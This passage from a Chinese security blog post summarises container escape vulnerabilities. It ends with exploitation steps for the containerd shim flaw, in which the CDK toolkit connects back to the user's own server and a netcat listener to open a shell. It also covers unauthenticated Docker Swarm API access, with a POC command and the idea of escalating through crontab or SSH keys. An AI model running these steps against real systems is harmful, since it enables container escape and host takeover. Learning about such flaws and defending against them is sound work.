+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.下载容器渗透工具包</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/releases/tag/v1.0.1">https://github.com/cdk-team/CDK/releases/tag/v1.0.1</a></p>
+<p>2.在服务器NC监听端口</p>
+<p>3.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x cdk_linux_amd64</span><br><span class="line">./cdk_linux_amd64 run shim-pwn &lt;自己服务器IP&gt; &lt;NC端口&gt;</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>ref:</p>
+<p><a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=837">https://www.cdxy.me/?p=837</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/332334413">https://zhuanlan.zhihu.com/p/332334413</a></p>
+</blockquote>
+<h2 id="Docker-Swarm未授权访问致命令执行"><a href="#Docker-Swarm未授权访问致命令执行" class="headerlink" title="Docker-Swarm未授权访问致命令执行"></a>Docker-Swarm未授权访问致命令执行</h2><h3 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>使用Docker Swarm并且未对2375端口访问加任何限制访问措施</li>
+</ul>
+<h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在使用Docker Swarm的时候，管理的Docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，其实这是 Docker Remote API，可以执行Docker命令，比如访问 <a target="_blank" rel="noopener" href="http://host:2375/containers/json">http://host:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在Docker CLI上执行Docker ps的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。</p>
+<h3 id="漏洞POC-3"><a href="#漏洞POC-3" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://x.x.x.x:2375 ps</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>可通过挂载host目录，之后使用crontab或者写ssh key来利用。</p>
+
+    </div>
+    
+    <div class="footer clearfix">
+        <div class="tags float-left">
+            
+                <span>标签</span>
+                
+                <a href="/tags/Docker" rel="tag">Docker</a>
+                
+                <a href="/tags/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E" rel="tag">容器漏洞</a>
+                
+                <a href="/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8" rel="tag">容器逃逸</a>
+                
+                <a href="/tags/Docker%E6%BC%8F%E6%B4%9E" rel="tag">Docker漏洞</a>
+                
+            
+        </div>
+        <div class="tool float-right d-none d-lg-block">
+            <div data-toggle="tooltip" data-html="true"
+                 data-original-title="最后更新：2021年05月07日">
+                <span>最后更新：2021年05月07日</span>
+            </div>
+        </div>
+    </div>
+    
+</div>
+
+<div class="comments" id="comments">
+    
+    <h3 class="title">文章评论</h3>
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function () {
+        var disqus_config = function () {
+            this.page.url = 'http://example.com/2021/05/07/%E5%B8%B8%E8%A7%81%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/';
+            this.page.identifier = '2021/05/07/常见容器漏洞总结/';
+            this.page.title = '常见容器漏洞总结';
+        };
+        var d = document,
+            s = d.createElement('script');
+        s.async = true;
+
+        s.src = 'https://Uncl3N1n3.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+
+</script>
+
+    <script id="dsq-count-scr" src="https://Uncl3N1n3.disqus.com/count.js" async></script>
+
+
+</div>
+            </div>
+            <div class="col-lg-4 sidebar d-none d-lg-block">
+                
+    
+        
+
+        
+            <div class="widget w-about">
+    <div class="background"
+         style="background:url(/img/about-background.png) no-repeat center center;-webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover;"></div>
+    <div class="wrapper text-center">
+        <img src="/img/avatar.jpg">
+    </div>
+    <div class="textwidget text-center"><p class="username">小九</p>
+        <p class="about">Just For Fun</p></div>
+</div>
+        
+    
+        
+
+        
+            
+    <div class="widget widget_toc">
+        <div class="title">
+            <i class="fas fa-book"> </i>
+            文章大纲
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-text">常见容器漏洞总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker-RunC%E6%BC%8F%E6%B4%9E%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-CVE-2019-5736"><span class="toc-text">Docker-RunC漏洞致容器逃逸(CVE-2019-5736)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EPOC"><span class="toc-text">漏洞POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker-cp%E6%BC%8F%E6%B4%9E%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-CVE-CVE-2019-14271"><span class="toc-text">Docker-cp漏洞致容器逃逸(CVE-CVE-2019-14271)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EPOC-1"><span class="toc-text">漏洞POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker-Containerd%E6%BC%8F%E6%B4%9E%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-CVE-2020-15257"><span class="toc-text">Docker-Containerd漏洞致容器逃逸(CVE-2020-15257)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EPOC-2"><span class="toc-text">漏洞POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker-Swarm%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">Docker-Swarm未授权访问致命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EPOC-3"><span class="toc-text">漏洞POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="toc-text">漏洞利用</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+
+        
+    
+        
+
+        
+            
+
+<div class="widget w-search">
+    <div class="item" id="search-form">
+        <div id="result-mask" class="hide"></div>
+        
+        <div class="input-group mt-2 mb-2">
+            <input id="search-key" class="form-control" type="search" autocomplete="off" placeholder="搜点什么呢?">
+            <div class="input-group-append">
+                <button type="button" class="btn btn-primary btn-search" id="search-local">搜索</button>
+            </div>
+        </div>
+        
+    </div>
+    <div id="result-wrap" class="hide">
+        <div id="search-result" class="search-result"></div>
+    </div>
+    <div class="hide">
+        <template id="search-tpl">
+            <div class="item">
+                <a href="/{path}" title="{title}">
+                    <div class="title">{title}</div>
+                    <div class="content">{content}</div>
+                </a>
+            </div>
+        </template>
+    </div>
+</div>
+
+        
+    
+        
+
+        
+            
+<div class="widget widget_categories">
+    <div class="title">
+        <i class="fas fa-book"> </i>
+        分类目录
+    </div>
+    <ul>
+        
+        <li class="cat-item cat-item-index"><a
+                    href="/categories/develop/">编程开发</a>
+        </li>
+        
+        <li class="cat-item cat-item-index"><a
+                    href="/categories/develop/Yii2/">Yii2</a>
+        </li>
+        
+        <li class="cat-item cat-item-index"><a
+                    href="/categories/myspace/">随笔</a>
+        </li>
+        
+        <li class="cat-item cat-item-index"><a
+                    href="/categories/resources/">工具资源</a>
+        </li>
+        
+        <li class="cat-item cat-item-index"><a
+                    href="/categories/develop/Django/">Django</a>
+        </li>
+        
+        <li class="cat-item cat-item-index"><a
+                    href="/categories/security/">信息安全</a>
+        </li>
+        
+    </ul>
+</div>
+
+        
+    
+        
+
+        
+            
+<div class="widget w-tags">
+    <div class="title">
+        <i class="fas fa-cloud" id="tags_switch"> </i>
+        标签聚合
+<!--        <div class="tags-random"><i class="fas fa-sync" id="change_tags"> 换一批</i> </div>-->
+    </div>
+    <div class="item">
+        
+        
+        
+            
+                <a href="/tags/%E7%AE%97%E6%B3%95/">算法</a>
+            
+                <a href="/tags/MariaDB/">MariaDB</a>
+            
+                <a href="/tags/%E4%BB%93%E5%BA%93%E5%90%8C%E6%AD%A5/">仓库同步</a>
+            
+                <a href="/tags/dnspod/">dnspod</a>
+            
+                <a href="/tags/Django/">Django</a>
+            
+                <a href="/tags/git/">git</a>
+            
+        
+    </div>
+</div>
+
+        
+    
+        
+
+        
+            
+<div class="widget w-recommended">
+    <div class="nav nav-tabs d-none d-xl-flex" id="nav-tab" role="tablist">
+        <a class="nav-item nav-link active" id="nav-random-tab" data-toggle="tab" href="#nav-random" role="tab"
+           aria-controls="nav-random" aria-selected="true"><i class="kicon i-tabrandom"></i>随机</a>
+        <a class="nav-item nav-link " id="nav-new-tab" data-toggle="tab" href="#nav-new" role="tab"
+           aria-controls="nav-new" aria-selected="false"><i class="kicon i-tabnew"></i>最新</a>
+        
+        <a class="nav-item nav-link" id="nav-hot-tab" data-toggle="tab" href="#nav-hot" role="tab"
+           aria-controls="nav-hot" aria-selected="false"><i class="kicon i-tabhot"></i>热点</a>
+        
+    </div>
+    <div class="nav nav-tabs d-xl-none" id="nav-tab" role="tablist">
+        <a class="nav-item nav-link active" id="nav-random-tab" data-toggle="tab" href="#nav-random" role="tab"
+           aria-controls="nav-random" aria-selected="true">随机</a>
+        <a class="nav-item nav-link " id="nav-new-tab" data-toggle="tab" href="#nav-new" role="tab"
+           aria-controls="nav-new" aria-selected="false">最新</a>
+        
+        <a class="nav-item nav-link" id="nav-hot-tab" data-toggle="tab" href="#nav-hot" role="tab"
+           aria-controls="nav-hot" aria-selected="false">热点</a>
+        
+    </div>
+    <div class="tab-content" id="nav-tabContent">
+        
+        <div class="tab-pane fade show active" id="nav-random" role="tabpanel" aria-labelledby="nav-random-tab">
+            
+
+
+
+    
+    
+        <a class="bookmark-item" title="PHP-GD库漏洞可导致服务器宕机"
+           href="/2018/02/02/GD%E5%BA%93%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%95%E6%9C%BA/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> PHP-GD库漏洞可导致服务器宕机</a>
+    
+        <a class="bookmark-item" title="Yii2 资源大全"
+           href="/2018/01/08/Yii2-resources/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> Yii2 资源大全</a>
+    
+        <a class="bookmark-item" title="Yii2 Audit插件的使用【日志记录插件】"
+           href="/2018/01/02/yii2-audit%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> Yii2 Audit插件的使用【日志记录插件】</a>
+    
+        <a class="bookmark-item" title="Codeception(三)"
+           href="/2018/01/29/Codeception-three/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> Codeception(三)</a>
+    
+        <a class="bookmark-item" title="PHP反射机制"
+           href="/2018/01/15/PHPReflection/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> PHP反射机制</a>
+    
+        <a class="bookmark-item" title="Codeception安装使用（一）"
+           href="/2018/01/22/Codeception-first/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> Codeception安装使用（一）</a>
+    
+
+        </div>
+        <div class="tab-pane fade" id="nav-new" role="tabpanel" aria-labelledby="nav-new-tab">
+            
+    
+        
+        <a class="bookmark-item" title="常见容器漏洞总结"
+           href="/2021/05/07/%E5%B8%B8%E8%A7%81%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> 常见容器漏洞总结</a>
+        
+    
+        
+        <a class="bookmark-item" title="免费CDN加速手把手教程"
+           href="/2021/03/06/%E5%85%8D%E8%B4%B9CDN%E5%8A%A0%E9%80%9F%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E7%A8%8B/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> 免费CDN加速手把手教程</a>
+        
+    
+        
+        <a class="bookmark-item" title="Hexo加速"
+           href="/2021/02/18/Hexo%E5%8A%A0%E9%80%9F/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> Hexo加速</a>
+        
+    
+        
+        <a class="bookmark-item" title="记一次普通的渗透测试"
+           href="/2021/01/18/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> 记一次普通的渗透测试</a>
+        
+    
+        
+        <a class="bookmark-item" title="Git仓库同步附脚本"
+           href="/2020/08/21/Git%E4%BB%93%E5%BA%93%E8%BF%81%E7%A7%BB%E9%99%84%E8%84%9A%E6%9C%AC/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> Git仓库同步附脚本</a>
+        
+    
+        
+        <a class="bookmark-item" title="PHP-Xdebug"
+           href="/2018/03/02/PHP-Xdebug/"
+           rel="bookmark"><i class="fas fa-pencil-alt"> </i> PHP-Xdebug</a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+
+
+        </div>
+        
+            <div class="tab-pane fade" id="nav-hot" role="tabpanel" aria-labelledby="nav-hot-tab">
+            </div>
+        
+    </div>
+</div>
+
+        
+    
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="k-footer">
+    <div class="f-toolbox">
+        <div class="gotop ">
+            <div class="gotop-btn">
+                <span class="kicon i-up"></span>
+            </div>
+        </div>
+        
+
+    </div>
+    <div class="container">
+        <div class="row">
+            <div class="col-12 text-center">
+                <p class="social">
+                    
+                        
+                        
+                    
+                    <!--                    <?php-->
+                    <!--                    $social = array('s_sina', 's_bilibili', 's_coding', 's_gitee', 's_twitter', 's_telegram', 's_linkedin', 's_youtube', 's_github', 's_stackflow', 's_email');-->
+                    <!--                    foreach ($social as $social) {-->
+                    <!--                        if (kratos_option($social)) {-->
+                    <!--                            echo '<a target="_blank" rel="nofollow" href="' . kratos_option($social . '_url') . '"><i class="kicon i-' . str_replace("s_", "", $social) . '"></i></a>';-->
+                    <!--                    }-->
+                    <!--                    }-->
+                    <!--                    ?>-->
+                </p>
+                <p>
+                    COPYRIGHT © 2021 <a
+                            href="/">小九博客</a> ALL RIGHTS RESERVED.
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+        <script src="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/js/bootstrap.bundle.min.js?ver=4.5.0"></script>
+    
+        <script src="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/js/layer.min.js?ver=3.1.1"></script>
+    
+        <script src="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/js/kratos.min.js?ver=3.2.5"></script>
+    
+        <script src="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/js/comments.min.js?ver=3.2.5"></script>
+    
+
+
+
+    <script src="/js/widgets/search.js"></script>
+
+
+    <script src="/js/widgets/tags.js"></script>
+
+
+
+    <script src="https://www.gstatic.com/firebasejs/8.2.6/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.6/firebase-firestore.js"></script>
+<script>
+    var hotest = []
+    $(function(){
+        var firebaseConfig = {
+            apiKey: "AIzaSyDNd2Yn4CxzvywabcXbRCnAnHxlqqjcZRY",
+            authDomain: "blog-93530.firebaseapp.com",
+            projectId: "blog-93530",
+            storageBucket: "blog-93530.appspot.com",
+            messagingSenderId: "11551113906",
+            appId: "1:11551113906:web:0a298c6ecf2e73d15dbfab",
+            measurementId: "G-HEYJLNQ883"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        function initHotest(articles){
+            articles.orderBy("count","desc").limit(6).get().then(function(items){
+                items.forEach(function(doc){
+                    $("#nav-hot").append(
+                        "        <a class=\"bookmark-item\" title=\""+doc.id+"\"\n" +
+                        "           href=\"/"+doc.data().path+"\"\n" +
+                        "           rel=\"bookmark\"><i class=\"fas fa-pencil-alt\"> </i> "+doc.id+"</a>"
+                    )
+                })
+            })
+        }
+        function getCount(doc, increaseCount, url_path) {
+            //increaseCount will be false when not in article page
+            return doc.get().then(function (d) {
+                var count
+                if (!d.exists) { //has no data, initialize count
+                    if (increaseCount) {
+                        if (url_path) {
+                            doc.set({
+                                count: 1,
+                                path: url_path
+                            })
+                        }else{
+                            doc.set({
+                                count: 1
+                            })
+                        }
+                        count = 1
+                    }
+                    else {
+                        count = 0
+                    }
+                }
+                else { //has data
+                    count = d.data().count
+                    if (increaseCount) {
+                        if (!(window.localStorage && window.localStorage.getItem(title))) { //if first view this article
+                            if (url_path) {
+                                doc.set({
+                                    count: count + 1,
+                                    path: url_path
+                                })
+                            }else{
+                                doc.set({
+                                    count: count + 1
+                                })
+                            }
+                            count++
+                        }
+                    }
+                }
+                if (window.localStorage && increaseCount) { //mark as visited
+                    localStorage.setItem(title, true)
+                }
+
+                return count
+            })
+        }
+
+        function appendCountTo(el) {
+            return function (count) {
+                $(el).append(
+                    $('<span>').addClass('post-visitors-count').append(
+
+                    ).append(
+                        $('<span>').addClass('post-meta-item-icon').append(
+                            $('<i>').addClass('kicon i-hot')
+                        )
+                    ).append($('<span>').text(count + '点热度'))
+                )
+            }
+        }
+        var db = firebase.firestore()
+        var articles = db.collection('articles')
+
+        initHotest(articles)
+
+        //https://hexo.io/zh-tw/docs/variables.html
+        var isPost = '常见容器漏洞总结'.length > 0
+        var isArchive = 'false' === 'true'
+        var isCategory = 'false' === 'true'
+        var isTag = 'false' === 'true'
+        if (isPost) { //is article page
+            var title = '常见容器漏洞总结'
+            var path = '2021/05/07/常见容器漏洞总结/'
+            var doc = articles.doc(title)
+            getCount(doc, true,path).then(appendCountTo($('.post-meta')))
+        } else { //is index page
+            var titles = []; //array to titles
+            
+            var promises = titles.map(function (title) {
+                return articles.doc(title)
+            }).map(function (doc) {
+                return getCount(doc)
+            })
+            Promise.all(promises).then(function (counts) {
+                var metas = $('.post-meta')
+                counts.forEach(function (val, idx) {
+                    appendCountTo(metas[idx])(val)
+                })
+            })
+        }
+    })
+</script>
+
+</body>
+
+</html>
